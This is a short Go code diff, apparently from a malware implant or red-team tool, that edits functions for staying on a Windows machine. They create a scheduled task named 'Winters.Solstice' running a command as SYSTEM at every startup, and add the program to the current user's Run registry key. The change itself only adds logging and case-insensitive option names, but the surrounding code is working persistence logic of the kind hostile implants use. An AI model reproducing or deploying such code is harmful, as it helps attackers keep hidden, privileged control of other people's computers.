@@ -105,7 +105,9 @@ func schtaskPersistence() error {
 	if er != nil {
 		log.Println(er)
 	}
-	_, err := cmdOut(fmt.Sprintf(`schtasks /create /tn "Winters.Solstice" /sc onstart /ru system /tr "cmd.exe /c %s`, cmd))
+	s, err := cmdOut(fmt.Sprintf(`schtasks /create /tn "Winters.Solstice" /sc onstart /ru system /tr "cmd.exe /c %s`, cmd))
+	log.Println(s)
+	log.Println(err)
 	return err
 }
 
@@ -113,14 +115,17 @@ func startUpPersistence() error {
 	path := os.Args[0] //, er := GetName()
 
 	err := WriteRegistryKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, "solstice", path)
+	if err != nil {
+		log.Println(err)
+	}
 	return err
 }
 
 func addPersistentCommand(persistenceType string) error {
 	var err error
-	if persistenceType == "Schtasks" {
+	if persistenceType == "schtasks" || persistenceType == "Schtasks" {
 		err = schtaskPersistence()
-	} else if persistenceType == "Startup" {
+	} else if persistenceType == "startup" || persistenceType == "Startup" {
 		err = startUpPersistence()
 	}
 	return err
